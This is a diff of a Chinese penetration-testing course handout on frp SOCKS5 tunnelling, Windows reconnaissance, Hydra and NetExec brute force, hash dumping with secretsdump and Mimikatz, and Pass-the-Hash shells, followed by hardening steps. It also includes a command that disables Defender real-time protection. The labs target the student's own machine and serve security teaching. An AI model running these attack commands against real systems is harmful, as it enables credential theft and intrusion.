@@ -86,7 +86,7 @@ frp 的解决方案（利用出站通道）：
   │            │         │  frps 服务端    │         │  frpc 客户端│
   │            │         │                 │         │            │
   │  访问      │   ②     │  转发请求       │   ③    │  提供服务   │
-  │  :10001───┼────────►│  给 frpc       ├────────►│  RDP(3389) │
+  │  :10002───┼────────►│  给 frpc       ├────────►│  Web(80)   │
   │            │         │                 │         │            │
   │            │         │◄────────────────┼─────────│  主动连接   │
   │            │         │       ①        │         │  (出站)    │
@@ -669,13 +669,12 @@ http://<CVM公网IP>:10002
 ```
 TCP隧道模式（逐一映射）：
   验证端 → CVM:10002 → Win11实验主机:80（phpStudy Web）
-  验证端 → CVM:10001 → 授权靶机:3389（RDP，扩展演示）
-  验证端 → CVM:10004 → 授权靶机:445（SMB，扩展演示）
-  缺点：每暴露一个服务就要加一条配置
+  缺点：每暴露一个服务就要加一条配置，且只映射了 Web 端口
+         无法访问 RDP(3389)、SMB(445) 等未映射的服务
 
 SOCKS5代理模式（一键穿透）：
   验证端 → CVM:10080 → Win11实验主机（SOCKS5服务）→ Win11可访问的任何地址:任何端口
-  优点：一条隧道即可访问 Win11 实验主机所在网络中的服务
+  优点：一条隧道即可访问 Win11 实验主机所在网络中的所有服务（RDP、SMB、WinRM 等）
 ```
 
 **proxychains** 是 Linux 下的代理链工具，可以强制让任何程序的网络流量通过 SOCKS5 代理转发。配合 frp 的 SOCKS5 隧道，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作。
@@ -738,118 +737,16 @@ Firefox 设置方法：
 
 ---
 
-### 实验5：nps 内网穿透独立实验（Web管理界面）
+### 📎 拓展对比：其他内网穿透工具
 
-> **实验目标**：独立体验 nps 的 Web 管理界面。只需要腾讯云 CVM 和本机 Win11/phpStudy，不依赖前面的 frp 隧道。
->
-> ⚠️ **前置条件**：CVM 安全组放行 8080（nps Web 管理）、8024（npc 客户端连接）和 10012（Web 映射端口）；Win11 上 phpStudy 的 Apache 已启动。
+除了 frp，还有以下常用工具。了解它们的特点有助于理解不同场景下的工具选型：
 
-**第一步：在腾讯云 CVM 上安装 nps 服务端**
+| 工具 | 特点 | 配置方式 | 适用场景 |
+| --- | --- | --- | --- |
+| **nps** | Web 管理界面，操作直观 | 服务端：`./nps`；客户端：`npc -server=<IP>:8024 -vkey=<密钥>`；隧道在 Web 界面(8080)中添加 | 课堂演示观察隧道状态；新手友好 |
+| **SSH 隧道** | 无需额外安装任何工具 | 远程转发：`ssh -R <远程端口>:127.0.0.1:<本地端口> root@<CVM> -N -f`；动态代理：`ssh -D 1080 root@<CVM> -N -f` | 临时应急、没有条件部署 frp/nps 时 |
 
-```bash
-# 在腾讯云网页登录终端中执行
-cd /opt
-wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
-mkdir nps && tar -xzf linux_amd64_server.tar.gz -C nps
-cd nps
-```
-
-**第二步：配置并启动 nps**
-
-```bash
-# 使用 vim 编辑配置
-vim conf/nps.conf
-```
-
-确认关键配置：
-
-```ini
-web_port=8080
-web_username=admin
-web_password=admin123
-bridge_port=8024
-bridge_type=tcp
-```
-
-> ⚠️ **安全组提醒**：需放行 8080（Web管理）、8024（客户端连接）和 10012（Web 映射）端口。
-
-```bash
-# 启动 nps
-./nps
-# 预期：nps start successfully
-```
-
-**第三步：通过 Web 界面添加客户端和隧道**
-
-1. 浏览器访问 `http://<CVM公网IP>:8080`，登录 admin/admin123
-2. 客户端 → 新增 → 备注名 `Win11-phpStudy`，验证密钥 `npstest2025` → 保存
-3. 点击 `Win11-phpStudy` 旁的"隧道"→ 新增 TCP 隧道：服务端端口 `10012`，目标 `127.0.0.1:80`
-
-**第四步：在 Win11 上运行 nps 客户端**
-
-```powershell
-# 在 Win11 上下载并启动 npc
-Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
-# 解压后运行：
-C:\npc\npc.exe -server=<CVM公网IP>:8024 -vkey=npstest2025
-```
-
-**第五步：验证**
-
-```bash
-nmap -p 10012 <CVM公网IP>
-# 预期：10012/tcp open
-```
-
-浏览器访问 `http://<CVM公网IP>:10012`，预期显示 Win11 phpStudy 的响应式页面。
-
-> 💡 **nps vs frp**：nps 有 Web 管理界面，操作直观，适合课堂观察隧道状态；frp 性能更高、配置更灵活、社区更活跃。两个工具安排为独立实验，便于比较配置方式和管理体验。
-
----
-
-### 实验6：SSH 隧道内网穿透
-
-> SSH 隧道无需安装额外工具，适合临时使用。
-
-**SSH隧道类型**：
-
-```
-1. 远程端口转发（-R）——最适合内网穿透：
-   内网主机主动 SSH 连接到 CVM，将自己的端口暴露到 CVM 上
-
-2. 本地端口转发（-L）：
-   验证端通过 SSH 连接到 CVM，将 CVM 可达的端口映射到本地
-
-3. 动态端口转发（-D）：
-   通过 SSH 创建 SOCKS5 代理
-```
-
-**远程端口转发（推荐）**：
-
-```powershell
-# 在内网主机上执行：将本地 Web 暴露到 CVM 的 10022 端口
-ssh -R 10022:127.0.0.1:80 root@<CVM公网IP> -N -f
-```
-
-```bash
-# 在验证环境中验证
-nmap -p 10022 <CVM公网IP>
-# 预期：10022/tcp open
-
-curl http://<CVM公网IP>:10022
-```
-
-**动态端口转发（SOCKS5）**：
-
-```bash
-# 在验证环境中通过 CVM 创建 SOCKS5 代理
-ssh -D 1080 root@<CVM公网IP> -N -f
-
-# proxychains 配置：socks5 127.0.0.1 1080
-proxychains curl http://127.0.0.1:10002
-```
-
-> 💡 **SSH 隧道 vs frp**：SSH 隧道不需要额外安装工具，适合临时使用；frp 更适合持久化穿透（可注册为服务、支持断线重连、有 Dashboard）。
+> 💡 **工具选型建议**：frp 性能最高、配置最灵活、社区最活跃，是本课主线工具；nps 适合需要 Web 可视化管理的场景；SSH 隧道零依赖，适合临时使用。三者的原理完全相同——利用出站连接建立反向隧道。
 
 ---
 
@@ -857,11 +754,10 @@ proxychains curl http://127.0.0.1:10002
 
 | 知识点 | 要点 |
 | --- | --- |
-| SOCKS5代理 | 一条隧道即可访问目标主机所在网络的所有服务，无需逐一配置端口映射 |
-| proxychains | 强制让任意程序的网络流量通过 SOCKS5 代理转发 |
-| nps | 提供Web管理界面的内网穿透工具，操作直观，适合新手 |
-| SSH隧道 | -R远程转发（暴露本地端口）、-D动态转发（SOCKS5代理），无需额外安装 |
-| proxychains限制 | 只能用-sT扫描，速度慢，无法使用ICMP和SYN扫描 |
+| SOCKS5 代理 | 一条隧道即可访问目标主机所在网络的所有服务，无需逐一配置端口映射 |
+| proxychains | 强制让任意程序的网络流量通过 SOCKS5 代理转发；只能用 `-sT` 扫描，速度较慢 |
+| nps | 提供 Web 管理界面的内网穿透工具，操作直观 |
+| SSH 隧道 | `-R` 远程转发（暴露本地端口）、`-D` 动态转发（SOCKS5 代理），零依赖临时使用 |
 
 ---
 
@@ -919,11 +815,11 @@ proxychains curl http://127.0.0.1:10002
 
 ## 🛠️ 实践操作
 
-### 实验7：Windows 内网信息收集（在 Win11 实验主机或授权靶机上执行）
+### 实验5：Windows 内网信息收集（在 Win11 实验主机上执行）
 
 > **操作方式**：本实验同时提供图形界面和命令行两种方式。
 >
-> **实验背景**：假设你正在对本机 Win11 实验主机或教师提供的授权靶机做安全检查，现在需要了解这台机器和它所在的内网环境。
+> **实验背景**：假设你正在对本机 Win11 实验主机做安全检查，现在需要了解这台机器和它所在的内网环境。
 
 **第一步：本机网络信息——"我在哪？"**
 
@@ -1014,11 +910,11 @@ net view \\<其他主机IP>
 
 ---
 
-### 实验8：Nmap 内网扫描（通过 frp 隧道从验证环境执行）
+### 实验6：Nmap 内网扫描（通过 frp 隧道从验证环境执行）
 
 > ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用。
 >
-> **实验背景**：实验7 中 `arp -a` 和 `ipconfig` 已经告诉我们 Win11 实验主机或授权靶机的网段和 IP。现在从验证环境通过 frp 隧道远程扫描目标，验证发现的信息并探测更多细节。
+> **实验背景**：实验5 中 `arp -a` 和 `ipconfig` 已经告诉我们 Win11 实验主机的网段和 IP。现在从验证环境通过 frp 隧道远程扫描目标，验证发现的信息并探测更多细节。
 
 **第一步：直接扫描 frp 映射端口（快速摸底）**
 
@@ -1045,7 +941,7 @@ proxychains nmap -sT -p 80,135,139,445,3389,5985 127.0.0.1
 # 预期输出：
 # PORT     STATE  SERVICE
 # 80/tcp   open   http
-# 其他端口是否开放取决于 Win11 或授权靶机的服务状态
+# 其他端口是否开放取决于 Win11 实验主机的服务状态
 ```
 
 > 💡 **SOCKS5 扫描 vs 直接扫映射端口**：
@@ -1085,14 +981,14 @@ proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
 
 ### 攻击链：从信息收集到横向移动
 
-前面的任务已经完成了攻击链的前三步：
+通过任务三的信息收集，我们已经知道 Win11 实验主机的 IP、开放端口和服务版本。现在进入攻击链的核心阶段——利用发现的弱点获取凭据，再用凭据横向移动。
 
 ```
-✅ 已完成                           ⬇️ 本任务要做的
+✅ 已完成                              ⬇️ 本任务要做的
 
-frp 隧道建立（任务一/二）            弱口令暴力破解 → 获取凭据
-内网信息收集（任务三）               Pass-the-Hash → 横向移动到其他主机
-    ↓                               获取更多凭据 → 扩大战果
+frp SOCKS5 隧道建立（任务一/二）        弱口令暴力破解 → 获取凭据
+内网信息收集（任务三）                  Pass-the-Hash → PtH 横向移动
+    ↓                                  获取更多凭据 → 扩大战果
 知道了目标 IP、端口、服务版本
 ```
 
@@ -1129,21 +1025,31 @@ Pass-the-Hash 攻击：
 
 ## 🛠️ 实践操作
 
-### 实验9：弱口令攻击
+### 实验7：弱口令攻击
 
-> ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 和 SMB 映射端口 10004 可用。
+> ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用（`proxychains curl http://127.0.0.1` 能返回 phpStudy 页面）。
+>
+> **攻击路径**：本实验通过 SOCKS5 代理访问 Win11 实验主机的 RDP(3389) 和 SMB(445) 服务，使用 Hydra 和 NetExec 进行弱口令暴力破解。由于 SOCKS5 代理从 frpc（Win11）本地发起连接，`127.0.0.1` 就是 Win11 实验主机自身。
 
-**前置准备——在授权靶机上创建弱口令账户**：
+**前置准备——在 Win11 实验主机上创建测试账户并启用服务**：
 
 ```powershell
-# 在授权靶机上以管理员身份运行
+# 在 Win11 实验主机上以管理员身份运行 PowerShell
+
+# 创建两个弱口令测试账户
 net user testuser P@ssw0rd /add
 net user admin123 123456 /add
 net localgroup administrators admin123 /add
 
+# 启用 RDP 远程桌面（Win11 默认已开启，这里确保配置正确）
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+# 确认 SMB 服务状态（Win11 默认开启）
+Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol
 ```
+
+> 💡 **为什么在自己的机器上做？** 通过 frp 的 SOCKS5 隧道，验证环境看到的 `127.0.0.1` 就是 Win11 实验主机自身。这样不需要额外的虚拟机或靶机，就能完整体验从暴力破解到横向移动的攻击链。实验结束后删除测试账户即可。
 
 **第一步：使用 Hydra 暴力破解 RDP**
 
@@ -1177,12 +1083,12 @@ qwerty
 ```
 
 ```bash
-# 通过 frp 隧道暴力破解 RDP
-hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<CVM公网IP> -s 10001 -t 4
+# 通过 SOCKS5 代理暴力破解 RDP（目标为 Win11 实验主机）
+proxychains hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://127.0.0.1 -s 3389 -t 4
 
 # 预期输出：
-# [3389][rdp] host: <CVM公网IP>   login: admin123   password: 123456
-# [3389][rdp] host: <CVM公网IP>   login: testuser   password: P@ssw0rd
+# [3389][rdp] host: 127.0.0.1   login: admin123   password: 123456
+# [3389][rdp] host: 127.0.0.1   login: testuser   password: P@ssw0rd
 ```
 
 > 💡 **攻击者视角**：找到了两个有效凭据——`admin123:123456` 和 `testuser:P@ssw0rd`。其中 `admin123` 是管理员，可以直接用于横向移动。
@@ -1191,23 +1097,23 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<CVM公网IP> -s 10001 -t 4
 
 ```bash
 # NetExec 比 Medusa 更适合 SMB 协议，输出信息更丰富
-# 验证 administrator 账户的密码列表
-nxc smb <CVM公网IP> --port 10004 -u administrator -p /tmp/passwords.txt
+# 通过 SOCKS5 代理验证 administrator 账户的密码列表
+proxychains nxc smb 127.0.0.1 -u administrator -p /tmp/passwords.txt
 
 # 预期输出（成功时显示 Pwn3d!）：
-# SMB  <CVM公网IP>:10004  授权靶机  [+] administrator:P@ssw0rd (Pwn3d!)
+# SMB  127.0.0.1  WIN11-HOST  [+] administrator:P@ssw0rd (Pwn3d!)
 
 # 批量验证多个用户
-nxc smb <CVM公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
+proxychains nxc smb 127.0.0.1 -u /tmp/users.txt -p /tmp/passwords.txt
 ```
 
 > 💡 **为什么用 nxc 而不是 Medusa？** NetExec 专为 Windows 协议设计，不仅能验证密码，还能直接远程执行命令（`-x "whoami"`）、导出哈希（`--sam`），是内网渗透的瑞士军刀。
 
 ---
 
-### 实验10：Pass-the-Hash 横向移动
+### 实验8：Pass-the-Hash 横向移动
 
-> ⚠️ **前置条件**：已通过实验9获取授权靶机的管理员凭据（`administrator:P@ssw0rd`）。
+> ⚠️ **前置条件**：已通过实验7获取 Win11 实验主机的管理员凭据（`administrator:P@ssw0rd`）。
 >
 > **攻击链位置**：弱口令破解 → 明文密码 → **获取哈希** → **PtH 横向移动**（本实验）
 
@@ -1215,8 +1121,8 @@ nxc smb <CVM公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
 
 ```bash
 sudo apt update
-sudo apt install -y impacket-scripts python3-impacket netexec
-which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
+sudo apt install -y impacket-scripts python3-impacket netexec hydra
+which impacket-secretsdump impacket-wmiexec impacket-psexec nxc hydra
 ```
 
 **第一步：获取 NTLM 哈希**
@@ -1225,7 +1131,7 @@ which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
 
 ```bash
 # 方法一：通过 secretsdump 远程导出（推荐，最简单）
-# 通过 SOCKS5 代理连接授权靶机，导出所有本地用户的哈希
+# 通过 SOCKS5 代理连接 Win11 实验主机，导出所有本地用户的哈希
 proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
 
 # 预期输出（关键部分）：
@@ -1233,7 +1139,8 @@ proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
 #                  ↑ LM Hash（通常为空）                ↑ NTLM Hash（这就是我们需要的）
 
 # 方法二：通过 Evil-WinRM + Mimikatz（交互式，更直观）
-evil-winrm -i <CVM公网IP> -P 10003 -u administrator -p 'P@ssw0rd'
+# Evil-WinRM 通过 SOCKS5 代理连接 Win11 实验主机的 WinRM 服务
+proxychains evil-winrm -i 127.0.0.1 -u administrator -p 'P@ssw0rd'
 
 # 在 Evil-WinRM 会话中执行 Mimikatz
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
@@ -1249,24 +1156,24 @@ upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 有了 NTLM 哈希，即使不知道密码也能登录目标机器：
 
 ```bash
-# 方法一：NetExec 快速验证哈希（最快，一行命令）
-nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
+# 方法一：NetExec 快速验证哈希（最快，一行命令，通过 SOCKS5 代理）
+proxychains nxc smb 127.0.0.1 -u administrator -H '<NTLM_HASH>'
 # 预期：显示 [+] administrator:<HASH> (Pwn3d!) → 哈希有效
 
 # 方法二：NetExec 远程执行命令（验证 + 执行一步到位）
-nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
+proxychains nxc smb 127.0.0.1 -u administrator -H '<NTLM_HASH>' -x "whoami"
 # 预期：显示命令执行结果 NT AUTHORITY\SYSTEM
 
-# 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5，无文件落地）
+# 方法三：Impacket wmiexec（交互式 Shell，无文件落地）
 proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
-# 预期：获得授权靶机的命令行 Shell
+# 预期：获得 Win11 实验主机的命令行 Shell
 
-# 方法四：Impacket psexec（SYSTEM 权限 Shell，走 SOCKS5）
+# 方法四：Impacket psexec（SYSTEM 权限 Shell）
 proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 # 预期：获得 NT AUTHORITY\SYSTEM 的最高权限 Shell
 ```
 
-> 💡 **PtH 的关键理解**：整个过程中我们**从未输入过密码**——只用了哈希。这就是为什么 NTLM 哈希在安全领域被视为"等价于密码"的敏感凭据。防御措施见任务五。
+> 💡 **PtH 的关键理解**：整个过程中我们**从未输入过密码**——只用了哈希。所有操作都通过 SOCKS5 代理完成，攻击机无需直接访问目标网络。这就是为什么 NTLM 哈希在安全领域被视为"等价于密码"的敏感凭据。防御措施见任务五。
 
 ---
 
@@ -1276,7 +1183,7 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 
 | 项目八（本讲义） | 实验六（独立实验） | 衔接点 |
 | --- | --- | --- |
-| frp内网穿透 → 建立隧道 | 域信息收集 → 识别域控 | 隧道建立后第一步是信息收集 |
+| frp 内网穿透 → 建立 SOCKS5 隧道 | 域信息收集 → 识别域控 | 隧道建立后第一步是信息收集 |
 | 弱口令暴力破解 | Kerberoasting → 提权 | 暴力破解的凭据可作为起点 |
 | PtH → 工作组横向移动 | DCSync → 域级横向移动 | PtH 获取的域管哈希可直接 DCSync |
 | 网络层加固 | 身份层加固 | 两者结合 = 完整防御体系 |
@@ -1288,12 +1195,12 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 | 知识点 | 要点 |
 | --- | --- |
 | 攻击链位置 | 信息收集（任务三）→ 弱口令破解 → 获取凭据 → PtH 横向移动 |
-| 弱口令攻击 | Hydra 暴力破解 RDP；NetExec 批量验证 SMB 凭据 |
+| 弱口令攻击 | proxychains + Hydra 暴力破解 RDP；proxychains + NetExec 批量验证 SMB 凭据 |
 | NTLM 哈希 | Windows 存储密码的"指纹"，在认证中等价于明文密码 |
 | Pass-the-Hash | 无需明文密码，直接用哈希完成认证 → 为什么"哈希泄露 = 密码泄露" |
-| 获取哈希 | `impacket-secretsdump`（远程导出）或 Mimikatz（本地提取） |
+| 获取哈希 | `proxychains impacket-secretsdump`（远程导出）或 Mimikatz（本地提取） |
 | 横向移动工具 | nxc（快速验证）、wmiexec（隐蔽执行）、psexec（SYSTEM Shell）、evil-winrm（交互式） |
-| frp 的角色 | 将内网服务映射到公网，使验证环境中的工具可以访问内网主机 |
+| SOCKS5 的角色 | 所有攻击工具通过 SOCKS5 代理访问内网目标，一条隧道覆盖全部攻击面 |
 
 ---
 
@@ -1347,14 +1254,14 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 
 ## 🛠️ 实践操作
 
-### 实验11：内网安全加固
+### 实验9：内网安全加固
 
-> 本实验在 Win11 实验主机或授权靶机上实施安全加固措施，然后从验证环境验证加固效果。
+> 本实验在 Win11 实验主机上实施安全加固措施，然后从验证环境通过 SOCKS5 代理验证加固效果。
 
 **第一步：启用 SMB 签名**
 
 ```powershell
-# 在 Win11 实验主机或授权靶机上执行
+# 在 Win11 实验主机上执行
 
 # 通过注册表启用 SMB 签名
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
@@ -1383,7 +1290,7 @@ Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountNa
 **第三步：配置防火墙限制横向移动**
 
 ```powershell
-# 在 Win11 实验主机或授权靶机上执行
+# 在 Win11 实验主机上执行
 
 # 启用防火墙
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
@@ -1433,9 +1340,9 @@ net share ADMIN$ /delete
 **第六步：验证加固效果**
 
 ```bash
-# 在验证环境中验证
-nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
-# 预期：STATUS_ACCESS_DENIED（Protected Users 生效）
+# 在验证环境中，通过 SOCKS5 代理重新尝试 PtH
+proxychains nxc smb 127.0.0.1 -u administrator -H '<NTLM_HASH>'
+# 预期：STATUS_ACCESS_DENIED（Protected Users 生效）或 SMB 签名强制拒绝中继
 ```
 
 ---
@@ -1465,8 +1372,8 @@ nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 | Win11/phpStudy | 本机启动 phpStudy Apache | `http://127.0.0.1` 可访问响应式页面 |
 | frpc 连接 | Win11 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
 | 隧道验证 | 验证环境执行 `nmap -p 10002,10080 <CVM公网IP>` | 端口 open |
-| Linux 工具 | `which nmap proxychains4 evil-winrm nxc` | 扩展实验时命令可用 |
-| Impacket | `sudo apt install -y impacket-scripts python3-impacket netexec` | 命令可用 |
+| SOCKS5 代理 | 验证环境配置 proxychains 并执行 `proxychains curl http://127.0.0.1` | 返回 phpStudy 页面 |
+| Linux 工具 | `which nmap proxychains4 hydra nxc impacket-secretsdump` | 命令可用 |
 
 > **实验结束后务必释放 CVM 实例，避免持续扣费。**
 
@@ -1487,10 +1394,10 @@ nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 | frp Dashboard | `http://<CVM公网IP>:7500` |
 | SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<CVM公网IP> -N -f` |
 | proxychains | `proxychains nmap -sT -p 端口 127.0.0.1` |
-| RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<CVM公网IP> -s 10001` |
-| SMB 密码喷洒 | `nxc smb <CVM公网IP> --port 10004 -u 用户 -p 密码.txt` |
+| RDP 暴力破解 | `proxychains hydra -L users.txt -P pwds.txt rdp://127.0.0.1 -s 3389` |
+| SMB 密码喷洒 | `proxychains nxc smb 127.0.0.1 -u 用户 -p 密码.txt` |
 | 获取哈希 | `proxychains impacket-secretsdump administrator:'密码'@127.0.0.1` |
-| PtH 攻击 | `nxc smb <IP> --port 10004 -u admin -H '<HASH>'` 或 `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
+| PtH 攻击 | `proxychains nxc smb 127.0.0.1 -u admin -H '<HASH>'` 或 `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
 | SMB 签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
 | Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"` |
 | krbtgt 重置 | `Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd -Reset`（两次） |
@@ -1502,10 +1409,8 @@ nxc smb <CVM公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 | CVM 端口不通 | 安全组未放行 | 在控制台添加入站规则 |
 | frpc 连接失败 | Token 不一致/安全组未放行/Win11 无法上网 | 逐项检查 |
 | 隧道已建立但无法访问服务 | 本地服务未启动或配置错误 | 确认服务运行，检查 frpc.toml |
-| proxychains 超时 | SOCKS5 隧道断开或配置错误 | 检查 frp SOCKS5 状态和 proxychains 配置 |
-| Hydra 超时 | frp 隧道延迟 | 增加 `-w 10`，降低 `-t 1` |
-| Evil-WinRM 失败 | WinRM 未启用 | 授权靶机上执行 `Enable-PSRemoting -Force` |
-| Mimikatz 被拦截 | Windows Defender | 关闭实时防护（仅实验环境） |
+| proxychains 超时 | SOCKS5 隧道断开或 proxychains 配置错误 | 检查 frp Dashboard 隧道状态；确认 proxychains 配置指向 `<CVM公网IP>:10080`；降低并发（`-t 1`） |
+| Mimikatz 被拦截 | Windows Defender 实时防护 | 关闭实时防护（`Set-MpPreference -DisableRealtimeMonitoring $true`，仅实验环境） |
 
 ---
 
